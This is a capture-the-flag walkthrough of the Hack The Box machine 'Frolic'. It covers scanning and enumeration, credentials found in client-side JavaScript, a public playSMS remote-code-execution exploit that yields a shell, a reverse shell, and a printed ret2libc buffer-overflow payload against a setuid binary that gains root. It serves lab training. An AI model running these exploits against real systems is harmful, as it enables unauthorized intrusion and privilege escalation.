# Frolic Walkthrough

![frolic](https://raw.githubusercontent.com/SUNNYSAINI01001/HackTheBox/main/Frolic/frolic.png)

## let's first fast scan the machine with nmap 

```console
sudo nmap -F -sV 10.10.10.111
```

### Result

```
PORT     STATE SERVICE     VERSION 
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0) 
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 
9999/tcp open  http        nginx 1.10.3 (Ubuntu) 
Service Info: Host: FROLIC; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## now let's also do a nmap berif scan on these ports.

```console
sudo nmap -A -O -v --script vuln 10.10.10.111
```

### Result

```
PORT     STATE SERVICE     VERSION 
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0) 
| vulners:  
|   cpe:/a:openbsd:openssh:7.2p2:  
|       2C119FFA-ECE0-5E14-A4A4-354A2C38071A    10.0    https://vulners.com/githubexploit/2C119FFA-ECE0-5E14-A4A4-354A2C38071A
*EXPLOIT* 
|       PACKETSTORM:140070      7.8     https://vulners.com/packetstorm/PACKETSTORM:140070      *EXPLOIT* 
|       EXPLOITPACK:5BCA798C6BA71FAE29334297EC0B6A09    7.8     https://vulners.com/exploitpack/EXPLOITPACK:5BCA798C6BA71FAE29
334297EC0B6A09  *EXPLOIT* 
|       EDB-ID:40888    7.8     https://vulners.com/exploitdb/EDB-ID:40888      *EXPLOIT* 
|       CVE-2016-8858   7.8     https://vulners.com/cve/CVE-2016-8858 
|       CVE-2016-6515   7.8     https://vulners.com/cve/CVE-2016-6515 
|       1337DAY-ID-26494        7.8     https://vulners.com/zdt/1337DAY-ID-26494        *EXPLOIT* 
|       SSV:92579       7.5     https://vulners.com/seebug/SSV:92579    *EXPLOIT* 
|       CVE-2016-10009  7.5     https://vulners.com/cve/CVE-2016-10009 
|       1337DAY-ID-26576        7.5     https://vulners.com/zdt/1337DAY-ID-26576        *EXPLOIT* 
|       SSV:92582       7.2     https://vulners.com/seebug/SSV:92582    *EXPLOIT* 
|       CVE-2016-10012  7.2     https://vulners.com/cve/CVE-2016-10012 
|       CVE-2015-8325   7.2     https://vulners.com/cve/CVE-2015-8325 
|       SSV:92580       6.9     https://vulners.com/seebug/SSV:92580    *EXPLOIT* 
|       CVE-2016-10010  6.9     https://vulners.com/cve/CVE-2016-10010 
|       1337DAY-ID-26577        6.9     https://vulners.com/zdt/1337DAY-ID-26577        *EXPLOIT* 
|       MSF:ILITIES/UBUNTU-CVE-2019-6111/       5.8     https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2019-6111/     *
EXPLOIT* 
|       MSF:ILITIES/SUSE-CVE-2019-6111/ 5.8     https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2019-6111/  *EXPLOIT* 
|       MSF:ILITIES/SUSE-CVE-2019-25017/        5.8     https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2019-25017/ *EXPLO
IT* 
|       MSF:ILITIES/REDHAT_LINUX-CVE-2019-6111/ 5.8     https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-6111/
*EXPLOIT* 
|       MSF:ILITIES/REDHAT-OPENSHIFT-CVE-2019-6111/     5.8     https://vulners.com/metasploit/MSF:ILITIES/REDHAT-OPENSHIFT-CV
E-2019-6111/    *EXPLOIT* 
|       MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-6111/       5.8     https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-
2019-6111/      *EXPLOIT* 
|       MSF:ILITIES/OPENBSD-OPENSSH-CVE-2019-6111/      5.8     https://vulners.com/metasploit/MSF:ILITIES/OPENBSD-OPENSSH-CVE
-2019-6111/     *EXPLOIT* 
|       MSF:ILITIES/IBM-AIX-CVE-2019-6111/      5.8     https://vulners.com/metasploit/MSF:ILITIES/IBM-AIX-CVE-2019-6111/    *
EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2019-6111/       5.8     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP8-CVE-2019-6111/      *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2019-6111/       5.8     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP5-CVE-2019-6111/      *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2019-6111/       5.8     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP3-CVE-2019-6111/      *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-6111/       5.8     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP2-CVE-2019-6111/      *EXPLOIT* 
|       MSF:ILITIES/GENTOO-LINUX-CVE-2019-6111/ 5.8     https://vulners.com/metasploit/MSF:ILITIES/GENTOO-LINUX-CVE-2019-6111/
*EXPLOIT* 
|       MSF:ILITIES/F5-BIG-IP-CVE-2019-6111/    5.8     https://vulners.com/metasploit/MSF:ILITIES/F5-BIG-IP-CVE-2019-6111/  *
EXPLOIT* 
|       MSF:ILITIES/DEBIAN-CVE-2019-6111/       5.8     https://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2019-6111/     *
EXPLOIT* 
|       MSF:ILITIES/CENTOS_LINUX-CVE-2019-6111/ 5.8     https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2019-6111/
*EXPLOIT* 
|       MSF:ILITIES/AMAZON_LINUX-CVE-2019-6111/ 5.8     https://vulners.com/metasploit/MSF:ILITIES/AMAZON_LINUX-CVE-2019-6111/
*EXPLOIT* 
|       MSF:ILITIES/AMAZON-LINUX-AMI-2-CVE-2019-6111/   5.8     https://vulners.com/metasploit/MSF:ILITIES/AMAZON-LINUX-AMI-2-
CVE-2019-6111/  *EXPLOIT* 
|       MSF:ILITIES/ALPINE-LINUX-CVE-2019-6111/ 5.8     https://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2019-6111/
*EXPLOIT* 
|       EXPLOITPACK:98FE96309F9524B8C84C508837551A19    5.8     https://vulners.com/exploitpack/EXPLOITPACK:98FE96309F9524B8C8
4C508837551A19  *EXPLOIT* 
|       EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97    5.8     https://vulners.com/exploitpack/EXPLOITPACK:5330EA02EBDE345BFC
9D6DDDD97F9E97  *EXPLOIT* 
|       EDB-ID:46516    5.8     https://vulners.com/exploitdb/EDB-ID:46516      *EXPLOIT* 
|       EDB-ID:46193    5.8     https://vulners.com/exploitdb/EDB-ID:46193      *EXPLOIT* 
|       CVE-2019-6111   5.8     https://vulners.com/cve/CVE-2019-6111 
|       1337DAY-ID-32328        5.8     https://vulners.com/zdt/1337DAY-ID-32328        *EXPLOIT* 
|       1337DAY-ID-32009        5.8     https://vulners.com/zdt/1337DAY-ID-32009        *EXPLOIT* 
|       SSV:91041       5.5     https://vulners.com/seebug/SSV:91041    *EXPLOIT* 
|       PACKETSTORM:140019      5.5     https://vulners.com/packetstorm/PACKETSTORM:140019      *EXPLOIT* 
|       PACKETSTORM:136234      5.5     https://vulners.com/packetstorm/PACKETSTORM:136234      *EXPLOIT* 
|       EXPLOITPACK:F92411A645D85F05BDBD274FD222226F    5.5     https://vulners.com/exploitpack/EXPLOITPACK:F92411A645D85F05BD
BD274FD222226F  *EXPLOIT* 
|       EXPLOITPACK:9F2E746846C3C623A27A441281EAD138    5.5     https://vulners.com/exploitpack/EXPLOITPACK:9F2E746846C3C623A2
7A441281EAD138  *EXPLOIT* 
|       EXPLOITPACK:1902C998CBF9154396911926B4C3B330    5.5     https://vulners.com/exploitpack/EXPLOITPACK:1902C998CBF9154396
911926B4C3B330  *EXPLOIT* 
|       EDB-ID:40858    5.5     https://vulners.com/exploitdb/EDB-ID:40858      *EXPLOIT* 
|       EDB-ID:40119    5.5     https://vulners.com/exploitdb/EDB-ID:40119      *EXPLOIT* 
|       EDB-ID:39569    5.5     https://vulners.com/exploitdb/EDB-ID:39569      *EXPLOIT* 
|       CVE-2016-3115   5.5     https://vulners.com/cve/CVE-2016-3115 
|       SSH_ENUM        5.0     https://vulners.com/canvas/SSH_ENUM     *EXPLOIT* 
|       PACKETSTORM:150621      5.0     https://vulners.com/packetstorm/PACKETSTORM:150621      *EXPLOIT* 
|       MSF:AUXILIARY/SCANNER/SSH/SSH_ENUMUSERS 5.0     https://vulners.com/metasploit/MSF:AUXILIARY/SCANNER/SSH/SSH_ENUMUSERS
*EXPLOIT* 
|       EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0    5.0     https://vulners.com/exploitpack/EXPLOITPACK:F957D7E8A0CC1E23C3
C649B764E13FB0  *EXPLOIT* 
|       EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283    5.0     https://vulners.com/exploitpack/EXPLOITPACK:EBDBC5685E3276D648
B4D14B75563283  *EXPLOIT* 
|       EDB-ID:45939    5.0     https://vulners.com/exploitdb/EDB-ID:45939      *EXPLOIT* 
|       EDB-ID:45233    5.0     https://vulners.com/exploitdb/EDB-ID:45233      *EXPLOIT* 
|       CVE-2018-15919  5.0     https://vulners.com/cve/CVE-2018-15919 
|       CVE-2018-15473  5.0     https://vulners.com/cve/CVE-2018-15473 
|       CVE-2017-15906  5.0     https://vulners.com/cve/CVE-2017-15906 
|       CVE-2016-10708  5.0     https://vulners.com/cve/CVE-2016-10708 
|       1337DAY-ID-31730        5.0     https://vulners.com/zdt/1337DAY-ID-31730        *EXPLOIT* 
|       CVE-2021-41617  4.4     https://vulners.com/cve/CVE-2021-41617 
|       MSF:ILITIES/OPENBSD-OPENSSH-CVE-2020-14145/     4.3     https://vulners.com/metasploit/MSF:ILITIES/OPENBSD-OPENSSH-CVE
-2020-14145/    *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-14145/      4.3     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP9-CVE-2020-14145/     *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-14145/      4.3     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP8-CVE-2020-14145/     *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2020-14145/      4.3     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP5-CVE-2020-14145/     *EXPLOIT* 
|       MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/   4.3     https://vulners.com/metasploit/MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/ *
EXPLOIT* 
|       EXPLOITPACK:802AF3229492E147A5F09C7F2B27C6DF    4.3     https://vulners.com/exploitpack/EXPLOITPACK:802AF3229492E147A5
F09C7F2B27C6DF  *EXPLOIT* 
|       EXPLOITPACK:5652DDAA7FE452E19AC0DC1CD97BA3EF    4.3     https://vulners.com/exploitpack/EXPLOITPACK:5652DDAA7FE452E19A
C0DC1CD97BA3EF  *EXPLOIT* 
|       EDB-ID:40136    4.3     https://vulners.com/exploitdb/EDB-ID:40136      *EXPLOIT* 
|       EDB-ID:40113    4.3     https://vulners.com/exploitdb/EDB-ID:40113      *EXPLOIT* 
|       CVE-2020-14145  4.3     https://vulners.com/cve/CVE-2020-14145 
|       CVE-2016-6210   4.3     https://vulners.com/cve/CVE-2016-6210 
|       1337DAY-ID-25440        4.3     https://vulners.com/zdt/1337DAY-ID-25440        *EXPLOIT* 
|       1337DAY-ID-25438        4.3     https://vulners.com/zdt/1337DAY-ID-25438        *EXPLOIT* 
|       CVE-2019-6110   4.0     https://vulners.com/cve/CVE-2019-6110 
|       CVE-2019-6109   4.0     https://vulners.com/cve/CVE-2019-6109 
|       CVE-2018-20685  2.6     https://vulners.com/cve/CVE-2018-20685 
|       SSV:92581       2.1     https://vulners.com/seebug/SSV:92581    *EXPLOIT* 
|       CVE-2016-10011  2.1     https://vulners.com/cve/CVE-2016-10011 
|       PACKETSTORM:151227      0.0     https://vulners.com/packetstorm/PACKETSTORM:151227      *EXPLOIT* 
|       PACKETSTORM:140261      0.0     https://vulners.com/packetstorm/PACKETSTORM:140261      *EXPLOIT* 
|       PACKETSTORM:138006      0.0     https://vulners.com/packetstorm/PACKETSTORM:138006      *EXPLOIT* 
|       PACKETSTORM:137942      0.0     https://vulners.com/packetstorm/PACKETSTORM:137942      *EXPLOIT* 
|       MSF:AUXILIARY/SCANNER/SSH/SSH_ENUMUSERS/        0.0     https://vulners.com/metasploit/MSF:AUXILIARY/SCANNER/SSH/SSH_E
NUMUSERS/       *EXPLOIT* 
|_      1337DAY-ID-30937        0.0     https://vulners.com/zdt/1337DAY-ID-30937        *EXPLOIT* 
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 
9999/tcp open  http        nginx 1.10.3 (Ubuntu) 
|_http-server-header: nginx/1.10.3 (Ubuntu) 
| http-enum:  
|   /admin/: Possible admin folder 
|   /admin/index.html: Possible admin folder 
|   /backup/: Possible backup 
|_  /test/: Test page 
|_http-csrf: Couldn't find any CSRF vulnerabilities. 
|_http-dombased-xss: Couldn't find any DOM based XSS. 
| http-vuln-cve2011-3192:  
|   VULNERABLE: 
|   Apache byterange filter DoS 
|     State: VULNERABLE 
|     IDs:  CVE:CVE-2011-3192  BID:49303 
|       The Apache web server is vulnerable to a denial of service attack when numerous 
|       overlapping byte ranges are requested. 
|     Disclosure date: 2011-08-19 
|     References: 
|       https://www.securityfocus.com/bid/49303 
|       https://www.tenable.com/plugins/nessus/55976 
|       https://seclists.org/fulldisclosure/2011/Aug/175 
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192 
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities. 
Aggressive OS guesses: Linux 3.12 (95%), Linux 3.13 (95%), Linux 3.2 - 4.9 (95%), Linux 3.8 - 3.11 (95%), Linux 4.8 (95%), Lin
ux 4.4 (95%), Linux 3.16 (95%), Linux 3.18 (95%), Linux 4.2 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%) 
No exact OS matches for host (test conditions non-ideal). 
Uptime guess: 199.646 days (since Wed Sep 22 22:08:47 2021) 
Network Distance: 2 hops 
TCP Sequence Prediction: Difficulty=263 (Good luck!) 
IP ID Sequence Generation: All zeros 
Service Info: Host: FROLIC; OS: Linux; CPE: cpe:/o:linux:linux_kernel 
 
Host script results: 
|_smb-vuln-ms10-061: false 
| smb-vuln-regsvc-dos:  
|   VULNERABLE: 
|   Service regsvc in Microsoft Windows systems vulnerable to denial of service 
|     State: VULNERABLE 
|       The service regsvc in Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference 
|       pointer. This script will crash the service if it is vulnerable. This vulnerability was discovered by Ron Bowes 
|       while working on smb-enum-sessions. 
|_           
|_smb-vuln-ms10-054: false 
 
TRACEROUTE (using port 3306/tcp) 
HOP RTT       ADDRESS 
1   295.42 ms 10.10.14.1 
2   292.06 ms 10.10.10.111
```

## we got 4 port open 22, 139, 445, 9999. i check samba ports but found nothing. then i acess http port i.e, 9999 and start dirbuster scan.

```console
dirb http://10.10.10.111:9999/
```

### Result

```
==> DIRECTORY: http://10.10.10.111:9999/admin/                                                                                
==> DIRECTORY: http://10.10.10.111:9999/backup/                                                                               
==> DIRECTORY: http://10.10.10.111:9999/dev/                                                                                  
==> DIRECTORY: http://10.10.10.111:9999/test/                                                                                 
                                                                                                                              
---- Entering directory: http://10.10.10.111:9999/admin/ ---- 
==> DIRECTORY: http://10.10.10.111:9999/admin/css/                                                                            
+ http://10.10.10.111:9999/admin/index.html (CODE:200|SIZE:634)                                                               
==> DIRECTORY: http://10.10.10.111:9999/admin/js/                                                                             
                                                                                                                              
---- Entering directory: http://10.10.10.111:9999/backup/ ---- 
+ http://10.10.10.111:9999/backup/index.php (CODE:200|SIZE:28) 

---- Entering directory: http://10.10.10.111:9999/dev/ ----
==> DIRECTORY: http://10.10.10.111:9999/dev/backup/
 + http://10.10.10.111:9999/dev/test (CODE:200|SIZE:5)
```

## now i first access admin directory and found a login page image given below.

![admin](https://raw.githubusercontent.com/SUNNYSAINI01001/HackTheBox/main/Frolic/admin.png)

## then i check page source and found a login.js file in script tag below is the content of that file

```
var attempt = 3; // Variable to count number of attempts.
// Below function Executes on click of login button.
function validate(){
var username = document.getElementById("username").value;
var password = document.getElementById("password").value;
if ( username == "admin" && password == "superduperlooperpassword_lol"){
alert ("Login successfully");
window.location = "success.html"; // Redirecting to other page.
return false;
}
else{
attempt --;// Decrementing by one.
alert("You have left "+attempt+" attempt;");
// Disabling fields after 3 attempts.
if( attempt == 0){
document.getElementById("username").disabled = true;
document.getElementById("password").disabled = true;
document.getElementById("submit").disabled = true;
return false;
}
}
}
```

## after reading this we found user ad admin and password as superduperlooperpassword_lol then i try to login after click on login a pop up window come that says login successfully then i click on ok and it redirect me to a sucess.html page 

![sucess](https://raw.githubusercontent.com/SUNNYSAINI01001/HackTheBox/main/Frolic/sucess.png)

## it something like hash then i search this hash decoder and found a website name https://www.dcode.fr/ook-language i enter the hash and it decode it and gave me result , image given below.

![sucesshash](https://raw.githubusercontent.com/SUNNYSAINI01001/HackTheBox/main/Frolic/sucesshash.png)

## it gives a directory i visit this directory and it also gives another hash that look like base64

![base64](https://raw.githubusercontent.com/SUNNYSAINI01001/HackTheBox/main/Frolic/base64.png)

## then i copy and paste this hash in a file and decode it using below command

```console
base64 -d filename > outputfilename
```

## after decode i check file type  using file command and it shows zip archive data when i try to unzip it. It ask for password then i randomly enter password as password and  it extract succesfully , you can also use fcrackzip tool for cracking zip file password

## then i unzip it and found a file named as index.php below is the content of this file.

```console
$ cat index.php                                                                                                            
4b7973724b7973674b7973724b7973675779302b4b7973674b7973724b7973674b79737250463067506973724b7973674b7934744c5330674c5330754b7973
674b7973724b7973674c6a77720d0a4b7973675779302b4b7973674b7a78645069734b4b797375504373674b7974624c5434674c5330745046306750693074
4c5330674c5330754c5330674c5330744c5330674c6a77724b7973670d0a4b317374506973674b79737250463067506973724b793467504373724b3173674c
5434744c53304b5046302b4c5330674c6a77724b7973675779302b4b7973674b7a7864506973674c6930740d0a4c533467504373724b3173674c5434744c53
30675046302b4c5330674c5330744c533467504373724b7973675779302b4b7973674b7973385854344b4b7973754c6a776743673d3d0d0a
```

## this hash look like ascii hash then i try to decode this hash using https://www.dcode.fr/ascii-code website after decode we found a base64 hash given below

```
KysrKysgKysrKysgWy0+KysgKysrKysgKysrPF0gPisrKysgKy4tLS0gLS0uKysgKysrKysgLjwr
KysgWy0+KysgKzxdPisKKysuPCsgKytbLT4gLS0tPF0gPi0tLS0gLS0uLS0gLS0tLS0gLjwrKysg
K1stPisgKysrPF0gPisrKy4gPCsrK1sgLT4tLS0KPF0+LS0gLjwrKysgWy0+KysgKzxdPisgLi0t
LS4gPCsrK1sgLT4tLS0gPF0+LS0gLS0tLS4gPCsrKysgWy0+KysgKys8XT4KKysuLjwgCg==
```

## then i decode this hash using https://www.base64decode.org/  website and got another hash given below.

```
+++++ +++++ [->++ +++++ +++<] >++++ +.--- --.++ +++++ .<+++ [->++ +<]>+
++.<+ ++[-> ---<] >---- --.-- ----- .<+++ +[->+ +++<] >+++. <+++[ ->---
<]>-- .<+++ [->++ +<]>+ .---. <+++[ ->--- <]>-- ----. <++++ [->++ ++<]>
++..< 
```

## i search this hash decoder on google and found it's brainfuck hash i decode this hash using https://www.dcode.fr/brainfuck-language website and found a string given below

```
idkwhatispass
```

## then i go to /playsms dirctory it gives a login page then i use admin as user and idkwhatispass as password and i successfully login, image given below.

![playsms](https://raw.githubusercontent.com/SUNNYSAINI01001/HackTheBox/main/Frolic/playsms.png)

## then i found a exploit for rce on github https://github.com/jasperla/CVE-2017-9101

## i download it and use it command given below

```console
$ python3 playsmshell.py --url http://10.10.10.111:9999/playsms --password idkwhatispass -i  
[*] Grabbing CSRF token for login 
[*] Attempting to login as admin 
[+] Logged in! 
[*] Grabbing CSRF token for phonebook import 
[+] Entering interactive shell; type "quit" or ^D to quit 
> id 
uid=33(www-data) gid=33(www-data) groups=33(www-data) 
 
> 
```

## we got www-data shell  then i use pentest monkey php reverse shell and gain a better shell using netcat listner.

## then i go to /home/ayush directory and list what inside in this directory using ls -la command got a suspicious directory name as .binary

```console
www-data@frolic:/home/ayush$ ls -la 
ls -la 
total 36 
drwxr-xr-x 3 ayush ayush 4096 Sep 25  2018 . 
drwxr-xr-x 4 root  root  4096 Sep 23  2018 .. 
-rw------- 1 ayush ayush 2781 Sep 25  2018 .bash_history 
-rw-r--r-- 1 ayush ayush  220 Sep 23  2018 .bash_logout 
-rw-r--r-- 1 ayush ayush 3771 Sep 23  2018 .bashrc 
drwxrwxr-x 2 ayush ayush 4096 Sep 25  2018 .binary 
-rw-r--r-- 1 ayush ayush  655 Sep 23  2018 .profile 
-rw------- 1 ayush ayush  965 Sep 25  2018 .viminfo 
-rwxr-xr-x 1 ayush ayush   33 Sep 25  2018 user.txt
```

## inside this directory got a binary file  named as rop. 

```console
www-data@frolic:/home/ayush/.binary$ ls -la 
ls -la 
total 16 
drwxrwxr-x 2 ayush ayush 4096 Sep 25  2018 . 
drwxr-xr-x 3 ayush ayush 4096 Sep 25  2018 .. 
-rwsr-xr-x 1 root  root  7480 Sep 25  2018 rop
```

## Notice its permissions, any user can execute it and do it as root because the sticky bit is set.So if we invoke a shell using this binary we get root, let's try.

## we need 5 things to succeed.
### 1. The offset to overwrite EIP
### 2. libc base address
### 3. system call offset
### 4. exit call offset (optional)
### 5. string “/bin/bash”

## To get the offset i use pattern_create method and got a number of 52

## To get libc base address we use ldd and grep for libc.

```console
ldd /home/ayush/.binary/rop |grep libc
```

### Result

```console
www-data@frolic:~$ ldd /home/ayush/.binary/rop |grep libc 
ldd /home/ayush/.binary/rop |grep libc 
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7e19000) 

```

## Now we need system call offset for libc we do

```console
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```

### Result

```console
www-data@frolic:~$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system 
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system 
   245: 00112f20    68 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr@@GLIBC_2.0 
   627: 0003ada0    55 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE 
  1457: 0003ada0    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
```

## same we do for exit function

```console
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit
```

### Result

```console
www-data@frolic:~$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit 
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit 
   112: 0002edc0    39 FUNC    GLOBAL DEFAULT   13 __cxa_at_quick_exit@@GLIBC_2.10 
   141: 0002e9d0    31 FUNC    GLOBAL DEFAULT   13 exit@@GLIBC_2.0 
   450: 0002edf0   197 FUNC    GLOBAL DEFAULT   13 __cxa_thread_atexit_impl@@GLIBC_2.18 
   558: 000b07c8    24 FUNC    GLOBAL DEFAULT   13 _exit@@GLIBC_2.0 
   616: 00115fa0    56 FUNC    GLOBAL DEFAULT   13 svc_exit@@GLIBC_2.0 
   652: 0002eda0    31 FUNC    GLOBAL DEFAULT   13 quick_exit@@GLIBC_2.10 
   876: 0002ebf0    85 FUNC    GLOBAL DEFAULT   13 __cxa_atexit@@GLIBC_2.1.3 
  1046: 0011fb80    52 FUNC    GLOBAL DEFAULT   13 atexit@GLIBC_2.0 
  1394: 001b2204     4 OBJECT  GLOBAL DEFAULT   33 argp_err_exit_status@@GLIBC_2.1 
  1506: 000f3870    58 FUNC    GLOBAL DEFAULT   13 pthread_exit@@GLIBC_2.0 
  2108: 001b2154     4 OBJECT  GLOBAL DEFAULT   33 obstack_exit_failure@@GLIBC_2.0 
  2263: 0002e9f0    78 FUNC    WEAK   DEFAULT   13 on_exit@@GLIBC_2.0 
  2406: 000f4c80     2 FUNC    GLOBAL DEFAULT   13 __cyg_profile_func_exit@@GLIBC_2.2
```

## now we need to find “/bin/sh” strings for this use below command

```console
strings -tx /lib/i386-linux-gnu/libc.so.6 | grep "/bin/sh"
```

### Result

```console
www-data@frolic:~$ strings -tx /lib/i386-linux-gnu/libc.so.6 | grep "/bin/sh" 
strings -tx /lib/i386-linux-gnu/libc.so.6 | grep "/bin/sh" 
 15ba0b /bin/sh
```

## now we got everything let's create a python exploit .

```
#!/usr/bin/python 
import struct 
def addr(x): 
        return struct.pack("I", x) 
junk = "A" * 52 
system = addr(0xb7e19000 + 0x0003ada0) 
exit = addr(0xb7e19000 + 0x0002e9d0) 
shell = addr(0xb7e19000 + 0x0015ba0b) 
 
payload = junk + system + exit + shell 
print payload 
```

## now let's save it into a file with py extension and upload it in /tmp directory of frolic machine and use below command for run this exploit.

```console
www-data@frolic:~$ /home/ayush/.binary/rop $(python /tmp/exploit.py)
```

# BOOOMMMM!!!! WE GOT ROOT

![funny](https://c.tenor.com/nACn01jOtBoAAAAC/happy-food.gif)
